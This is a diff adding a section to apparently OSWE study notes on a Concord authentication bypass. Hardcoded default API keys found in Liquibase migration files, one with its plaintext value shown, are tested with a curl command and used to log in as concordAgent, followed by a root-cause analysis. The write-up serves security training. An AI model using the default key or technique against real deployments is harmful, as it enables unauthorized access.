@@ -200,3 +200,75 @@ This demonstrates how CORS misconfigurations combined with missing CSRF protecti
 
 **Script sent to the victim:** https://github.com/m0hammad-yaser/OSWE-AWAE-Notes/blob/main/Concord/rce.html
 ## Authentication Bypass: Round Two - Insecure Defaults
+Even with modern browsers reducing CSRF vulnerabilities, applications like Concord can still be vulnerable due to **insecure default configurations** that lead to authentication bypass.
+
+#### Discovery Method: Database Migration Analysis
+
+##### 1. Understanding the Application Boot Process
+- Analyzed `start.sh` startup script
+- Found `MigrateDB` class handles database migrations
+- Migrations initialize/update database schema and data
+
+##### 2. Locating Migration Files
+- Found migration files in `server/db/src/main/resources/`
+- Uses **Liquibase** for database schema management
+- Migration files contain table definitions and **initial data inserts**
+
+##### 3. Discovering Hardcoded Credentials
+
+###### First Discovery (v0.0.1.xml):
+```xml
+<insert tableName="API_KEYS">
+    <column name="KEY_ID">d5165ca8-e8de-11e6-9bf5-136b5db23c32</column>
+    <!-- original: auBy4eDWrKWsyhiDp3AQiw -->
+    <column name="API_KEY">KLI+ltQThpx6RQrOc2nDBaM/8tDyVGDw+UVYMXDrqaA</column>
+    <column name="USER_ID">230c5c9c-d9a7-11e6-bcfd-bb681c07b26c</column>
+</insert>
+```
+**Result**: Both hashed and "original" values failed authentication (likely outdated).
+
+###### Second Discovery (v0.69.0.xml):
+```xml
+<insert tableName="API_KEYS">
+    <!-- "O+JMYwBsU797EKtlRQYu+Q" -->
+    <column name="API_KEY">1sw9eLZ41EOK4w/iV3jFnn6cqeAMeFtxfazqVY04koY</column>
+    <column name="USER_ID">${concordAgentUserId}</column>
+</insert>
+```
+
+#### Successful Authentication Bypass
+
+##### Testing the API Key:
+```bash
+curl -H "Authorization: O+JMYwBsU797EKtlRQYu+Q" http://concord:8001/api/v1/apikey
+```
+
+**Response:**
+```json
+[ {
+  "id" : "4805382e-98bc-11eb-a54f-0242ac140003",
+  "userId" : "d4f123c1-f8d4-40b2-8a12-b8947b9ce2d8",
+  "name" : "key-1"
+} ]
+```
+
+##### UI Login:
+- Used the API key with `?useApiKey=true` parameter
+- Successfully logged into the Concord web interface as `concordAgent`
+
+#### Root Cause Analysis
+
+##### Security Issues:
+1. **Hardcoded credentials** in migration files
+2. **Default API keys** not regenerated during installation
+3. **Developer comments** revealing original key values
+4. **Production deployment** with development credentials
+
+##### Why This Happened:
+- Developers included test/development API keys in migrations
+- Installation process doesn't regenerate default credentials
+- Migration files are part of source code (visible to attackers)
+- No credential rotation mechanism for default accounts
+
+#### Key Takeaway
+Applications often ship with insecure defaults from the development process. Analyzing database migrations and configuration files can reveal hardcoded credentials that provide immediate access to production systems. This demonstrates why **secure installation procedures** and **credential rotation** are critical security practices.
